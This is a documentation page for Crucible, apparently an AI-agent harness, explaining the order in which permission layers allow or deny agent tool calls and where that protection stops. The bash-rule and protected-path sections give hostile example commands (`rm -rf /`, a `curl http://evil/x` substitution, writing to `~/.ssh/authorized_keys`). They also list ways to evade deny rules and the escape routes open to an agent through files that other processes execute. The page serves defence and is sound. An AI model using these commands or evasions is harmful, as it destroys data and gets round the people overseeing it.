---
title: Permission Precedence
description: The order Crucible consults every layer that can allow or deny a tool call
status: implemented
tags:
  - concepts
  - permissions
  - security
  - lua
---

# Permission Precedence

Several things can decide whether a tool call runs: the agent card, the
`permissions` config, a CLI flag, a saved "allow for this project" pattern, a
Lua hook, and the session's mode. They are consulted in a fixed order, and the
first one with an opinion wins.

One function decides every tool call, whatever its source: the calls of
Crucible's own agents, the permission requests of an external ACP agent, a
plugin's `cru.tools.call`, and a workflow validation command. A source differs
only in the layers it cannot use. `cru.tools.call` and a workflow validation
command have no card, no saved patterns, no hooks, no mode and no prompt.
An ACP agent has no Crucible mode. Its mode is the agent's own, and its id can
name a Crucible mode with another rule (Claude calls a mode `auto`). Thus no
mode stance and no `plan` rule decides an ACP request, and a hook sees an empty
`request.mode`.

This page states that order once. The layers themselves are documented
separately — [[Help/Config/permissions]], [[Help/Extending/Event Hooks]],
[[Help/TUI/Modes]], [[Help/Extending/Agent Cards]].

## Read this before you rely on a `deny` rule

**Command blocking is best-effort. Do not rely on it to prevent a catastrophic
action.**

A `deny` rule reads the text of a command. A shell decides what a command *does*
at run time. The two are not the same thing, and text cannot answer the run-time
question. Crucible closes the differences it can see and reports the ones it
cannot, but the list of things it cannot see has no end:

- An alias or a shell function can point any name at any program.
- `$PATH` order decides which `rm` runs.
- A program that Crucible does not know can run another program.
- A different program can have the same effect. A rule that names `rm` does not
  cover `find . -delete`.
- A command name can come from a variable, and its value exists only at run time.

Treat a `deny` rule as a guard against an accident, not as a barrier against
intent. It stops an agent that makes a mistake. It does not stop an agent, or a
person, that works around it.

**To prevent a catastrophic action, use containment, not a rule.** Run the agent
in a container ([[Help/Extending/Container Isolation]]), give it a workspace it
may destroy, and keep backups of what matters. A permission rule is one layer of
defence and it is the weakest one.

## The order

Every tool call walks this list top to bottom. The first layer that says
**allow** or **deny** ends it; a layer with nothing to say falls through to the
next.

| # | Layer | Set by |
|---|-------|--------|
| 1 | Agent card `deny` | the session's agent card |
| 2 | `permissions` config `deny` | `init.lua` (global or kiln), or the agent profile |
| 3 | Agent card `allow` | the session's agent card |
| 4 | CLI `--permissions` override | the flag you launched with |
| 5 | Read-only exemption | the daemon's built-in list |
| 6 | `permissions` config `allow` | `init.lua` (global or kiln), or the agent profile |
| 7 | Saved patterns | answering "allow for this project" at a prompt |
| 8 | Lua permission hooks | `cru.permissions.on_request` |
| 9 | Mode rules, then mode stance | `cru.modes.<name>.permissions` |
| 10 | Non-interactive sessions: ask becomes deny | how the session was started |
| 11 | Prompt the user | — |

The implementation is `decide_permission` in
`crates/crucible-daemon/src/agent_manager/messaging/gate_decision.rs`; it is
the source of truth if this page ever drifts from it.

### 1 and 3 — Agent card

An agent card can declare a per-tool policy — `deny`, `ask`, or `allow` — see
[[Help/Extending/Agent Cards]]. A card entry keys the same way as a
`permissions` rule: a `bash` entry applies to every shell command, whichever
tool or agent runs it, and any other entry applies to the tool of that name.
When two entries apply, the strictest one wins.

- **`deny`** refuses the call. Denied tools are also excluded from the tool
  definitions the model sees.
- **`allow`** runs the call with no prompt, after layer 2. A card from an
  untrusted kiln therefore cannot walk past a configured deny. The call is
  marked auto-approved ("agent card policy").
- **`ask`** takes the read-only exemption (layer 5) away.

### 2 and 6 — `permissions` config

Config **deny is absolute** — nothing below can override it, the CLI flag
included. The hardcoded denies are part of this layer. Config **allow**
(including `default = "allow"`) runs the call at layer 6. Only `ask`, or no
matching rule, falls through.

A session whose agent names an agent profile with its own `[permissions]` block
uses that block instead of the global config. This applies to Crucible's own
agents and to external ACP agents.

### 4 — CLI override

`--permissions allow` or `--permissions deny` decides every call that layers 1
to 3 did not decide. It runs before any hook, so a hook cannot rescue a call the
flag denied, and cannot block one it allowed. `ask` and no flag fall through.
The permission handler of an ACP agent reads the flag of the current turn for
each request. A request outside a turn gets `cancelled`, because no turn state
applies to it.

### 5 — Read-only exemption

A tool on the daemon's built-in read-only list runs with no prompt, unless the
card says `ask` for it or an `ask` rule names it. An MCP server's `readOnlyHint`
is deliberately not consulted here: a third-party server must not be able to
annotate its way past a mode's `default = "deny"`. The kind of an ACP call is
not consulted either, because the agent supplies it.

### 7 — Saved patterns

When you answer a prompt with "allow for this project", the pattern is written
to the project's store and matched here on subsequent calls. Saved patterns are
per-project, not per-session, and survive restarts.

A pattern for a shell call is its command line, whichever shell tool made the call.
A pattern for an edit is a path, and it permits an edit only when it matches each path
of the edit. A pattern for any other call is its canonical tool name. The same patterns
answer the permission requests of an external ACP agent.

### 8 — Lua permission hooks

Hooks run in registration order and the first non-`nil` verdict wins. There
is no priority option: the shipped `runtime/defaults/init.luau` loads first,
then your `init.lua`, then the plugins alphabetically by name.

```lua
cru.permissions.on_request(function(request)
  if request.tool_name == "bash" and request.args.command:match("^git push") then
    return { deny = "pushes go through review" }
  end
end)
```

The shipped hook is therefore asked before yours. It answers `nil` for every
mode but `plan`, which is what leaves your hook reachable; in `plan` mode its
deny stands.

`{ pattern = "bash" }` filters at registration instead, so the hook is never
called for other tools:

```lua
cru.permissions.on_request(function(request)
  -- only ever sees bash
end, { pattern = "bash" })
```

`request.is_safe` tells you whether the daemon classifies the tool as read-only.
For external MCP tools that comes from the server's `readOnlyHint` annotation,
so a read-only tool is not lumped in with the ones that write. A tool that an
ACP agent runs itself is never safe here, also when its name is the name of a
Crucible tool (gemini `read_file`, or a `grep` of another MCP server).

**Hooks fail closed.** A hook that errors denies the call. This is the opposite
of every other hook type in Crucible, which fails open — a permission hook that
crashes must not become an approval.

### 9 — Mode rules, then mode stance

A mode can state a stance, a set of rules, or both:

```lua
cru.modes.review = {
  tools = { "read_*", "grep", "glob", "bash" },
  permissions = {
    default = "deny",
    allow = { "bash:rg *", "bash:git log *" },
  },
}
```

Rules are evaluated first, the bare stance second. Both use the same grammar and
the same engine as `permissions`, so `bash:rg *` inherits its handling of
chained commands — a mode that permits `rg` does **not** thereby permit
`rg foo && rm -rf /`. What that handling covers, and where it stops, is stated
in [What a `bash:` rule covers](#what-a-bash-rule-covers) below; read it before
relying on a mode's `allow` list as a boundary.

Modes come after hooks deliberately. A stance is a static declaration; a hook is
a decision. `cru.modes.auto` saying "allow by default" must not override a hook
that denies `bash`.

### 10 — Non-interactive sessions

A delegated child session or a headless send has nobody to answer a prompt.
Rather than hang, anything that reached this point is denied with a message
naming the three ways to permit it.

This step is easy to forget and it changes behaviour: the same tool call that
*asks* in your terminal *denies* inside a delegation. See [[Help/Concepts/Delegation]].

### 11 — Prompt

Whatever is left reaches you, with a diff preview where one can be synthesised.
A session shows one prompt at a time. A cancel of the turn ends the waiting
prompt with no answer: Crucible refuses its own tool call, and an ACP agent
receives `cancelled`, not a reject, because nobody refused the call.

An ACP agent receives only one of its own options: `allow_once` for an allow,
and `reject_once` for a denial. It never receives `allow_always` or
`reject_always`, because the agent would store a rule that the user never
chose, and stop asking. An agent that offers no option of the one kind receives
`cancelled`, which ends its turn. The protocol has no field
for a reason, so the reason reaches you and not the agent: the card of a refused
call shows the reason of the gate as its error, and the card of a call that a
layer allowed with no prompt shows the auto marker with that layer.

## What a `bash:` rule covers

A `bash:` rule's glob is matched against a command *string*, and one string can
run several commands. The config layers (2 and 6) and layer 9 therefore do not match the rule
against the whole line: they split it into statements first and evaluate each
one, so an `allow` rule only ever speaks for the command it names.

This section is the guarantee, stated once. It applies wherever the engine
runs — `permissions`, a mode's `permissions` block, and the saved patterns of
layer 7.

**The line is split on** `&&`, `||`, `;`, `|`, a bare `&`, and a newline —
outside quotes, and honouring backslash escapes. Every statement is checked
independently: the hardcoded denies and the `deny` rules must clear *all* of
them, and `Allow` requires *every* one to match an `allow` rule. So
`allow = ["bash:git *"]` with `deny = ["bash:rm *"]` denies all of
`git status && rm -rf /tmp/x`, `git status; rm …`, `git status | rm …`,
`git status & rm …`, and the same lines written across two lines.

Redirection syntax is not mistaken for a separator, so `2>&1`, `>&2`, `<&0` and
`&> out.log` stay part of the command they belong to.

**Some constructs hide a command from the splitter**, and where they appear the
decision falls to your configured `default` — `ask` unless you changed it —
instead of to whichever command happens to be leftmost:

- `` `…` `` and `$(…)` command substitution, including inside double quotes
  (single quotes suppress substitution, so those are matched normally)
- `<(…)` and `>(…)` process substitution
- a quote that never closes, which makes everything the scan saw after it
  unreliable

`git log $(curl http://evil/x)` therefore prompts rather than riding
`bash:git *`. This is a deliberate widening of what prompts: a workflow that
used to run silently under an `allow` rule will start asking once it contains a
substitution. A `deny` rule and a hardcoded deny still win over this fallback —
falling back never softens a refusal into a prompt.

**What it does not cover.** Be concrete about the edges rather than trusting the
split further than it goes:

- **Redirection targets are not modelled.** An `allow` rule constrains *which*
  command runs, never *where it writes*: `bash:echo *` permits
  `echo hi > ~/.ssh/authorized_keys`. Reporting `>` alongside the constructs
  above was considered and rejected — it hides no second command, and firing on
  every `> /dev/null` would make prompting the normal case. Allow-list only
  commands you would trust with a filesystem write, and reach for a Lua hook
  (layer 8) when you need the argument-level decision.
- **The allowed command's own power is yours to judge.** `bash:git *` permits
  `git config`, aliases, and hooks; most useful binaries are a write primitive
  or an execution primitive given the right flags.
- **A rule names a command, not an effect.** `deny = ["bash:rm *"]` follows `rm`
  through the ways a shell can spell it — `sudo rm`, `/bin/rm`, `env FOO=1 rm`,
  `(rm …)`, `xargs rm`, `timeout 5 rm`, a tab instead of a space — because the
  statement is also matched against its resolved command word
  (`resolve_command_word`). It does **not** follow the *effect*:
  `find . -delete` and `perl -e 'unlink …'` delete files and are not `rm`, so a
  rule naming `rm` never covers them. Name the program, or deny the tool.
- **The wrapper list is a list.** Wrappers outside it (`WRAPPERS` in
  `normalize.rs`) still hide the command they run. Adding one is a one-line
  change; noticing you needed to is the hard part.
- **Aliases, shell functions and `$PATH` are invisible.** `alias rm=…`, a
  function named `git` that calls `rm`, or a different `rm` earlier on the path
  are all outside what statement text can show. Resolution raises the cost of
  evading a `deny` rule; it does not make `deny` a sandbox — containment is the
  container.
- **`eval`, `sh -c` and expanded command names prompt instead.** Their program is
  data, so they are reported rather than guessed at and fall to the default. Under
  `default = "allow"` *with* `deny` rules configured they prompt rather than being
  allowed, since allowing them would mean the blocklist is silently unenforced on
  exactly the lines it cannot read.

The splitter is `split_command_line` in
`crates/crucible-core/src/config/components/permissions/normalize.rs`, and it is
the source of truth if this section drifts.

## Above the chain

Two checks run before the chain for Crucible's own agents. They decide whether
the chain runs at all, and no layer can override them.

### The agent-card deny

A card `deny` is ALSO checked before the `pre_tool_call` hook loop. A hook that
handles a call returns before any gate, so a later check would let a plugin
see the arguments of, rewrite, or fabricate a result for a tool the session
policy refuses. The chain asks the card again, for the call that the hooks
may have rewritten.

### The plugin isolation gate

A plugin that sandboxes a session — the `oci` plugin and its container, see
[[Help/Extending/Container Isolation]] — calls `cru.isolation.require` at
session start. From then on the session is **default-deny for host execution**:
a tool call that no `pre_tool_call` handler took over is refused before the
chain runs, because executing it would run wherever the daemon runs — outside
the sandbox. The handler taking the call over *is* the sandbox, which is why
this gate sits after the hook loop.

Whether a tool is "host-touching" is answered by its surface, declared by the
executor that would run it — not by a list of names:

- **Host** — touches the host filesystem or executes host processes. Refused
  unless named on the claim's `exempt` list.
- **Daemon** — reaches daemon-side state only: notes, embeddings, the kiln,
  jobs. Passes untouched; containerizing a workspace says nothing about these.
- **Unknown** — runs daemon-side but can reach anything (MCP gateway tools,
  plugin Lua). Treated exactly like Host.

The refusal message names the claiming plugin and points at its `exempt` list.
No layer in the chain can rescue a refused call — the chain never runs. The
claim is released at session end.

### Order within one call

Card `deny` → `pre_tool_call` handlers (a handled call bypasses everything
below) → isolation gate → the eleven-layer chain.

An ACP agent runs its own tools. Only its permission requests reach the chain,
and a call it does not ask about is its own decision.

## Underneath all of it

Five things are not part of the chain and cannot be overridden by any layer in
it:

- **Hardcoded denies** — a small set of calls the daemon refuses outright.
- **Protected paths** — a hardcoded set of directories that agent tools may
  **read but never write**, whatever the chain above decided: `.crucible/`,
  `.git/`, the other harnesses' `.claude/` `.codex/` `.opencode/` `.pi/`, the
  `runtime/` tree Crucible loads plugins from, `~/.config/crucible`, every
  session-transcript directory, and the shell startup files (`~/.bashrc`,
  `~/.zshrc`, …) **in your home directory** — a copy of the same file inside a
  dotfiles repository stays writable, because no shell reads that one.
  Nothing in the chain reaches this — a blanket
  `--permissions allow` decides that a tool *call* runs, and this decides what
  a *path* is, so the call runs and the write is still refused. There is no
  configuration key that re-opens one.

  The reason is that these are the files a trusted process later executes or
  reads as instructions: a plugin, an agent card, a skill, a git hook, another
  harness's settings, or a transcript replayed into a future context. An agent
  that can write one has escaped through the thing that consumes it rather
  than through the filesystem. It applies to paths that **do not exist yet** —
  creating the file is the attack — and to what a symlink at a protected path
  points to.

  Reads are deliberately untouched. Explaining your own plugin is ordinary
  work; rewriting it is not.
- **Filesystem containment** — a default-deny allowlist of the session's kilns,
  its workspace and its own session directory, with every transcript subtree
  those enclose carved back out. Every filesystem-touching tool goes through one
  capability handle to reach a path — `read_file`, `write_file`, `glob` and
  `grep` alongside the note, search and kiln tools — so the rule cannot differ
  between them, and a tool cannot obtain a path without having asked. The
  refusal names the path you asked for and, when a symlink carried it out of
  containment, where it landed.

  Scoped honestly: this holds for the file tools. `bash` reaches the filesystem
  through a shell the daemon does not mediate, so containment is defense in
  depth for a session rather than a boundary around it until the kernel-level
  backstop lands.
- **The shell policy** — parsing and vetting of shell commands, independent of
  whether `bash` was permitted.
- **Plan-mode tool filtering** — plan mode removes tools from what the agent can
  see at all. A tool that is not advertised cannot be called, so no permission
  question arises.

The first four are floors. Plan mode's filtering is a floor too, but note that
the *policy* half of plan mode is declared in Lua like any other mode's — see
[[Help/TUI/Modes]].

## Which layer should I use?

| You want | Use |
|---|---|
| A rule for every session on this machine | `permissions` config |
| A rule for one project | answer a prompt with "allow for this project" |
| A decision that depends on the arguments | a Lua hook |
| A named working posture you switch between | a mode |
| A per-agent tool list | an agent card — see [[Help/Extending/Agent Cards]] |

Reach for the earliest layer that expresses what you mean. A hook that
re-implements "always allow `cargo test`" is a config line written the hard way,
and it runs on every call.

## See also

- [[Help/Config/permissions]] — the rule grammar and config file
- [[Help/TUI/Modes]] — declaring and switching modes
- [[Help/Extending/Event Hooks]] — the hook system generally
- [[Help/Extending/Agent Cards]] — per-agent tool policy
- [[Help/Concepts/Trust and Classification]] — which providers may see which kilns
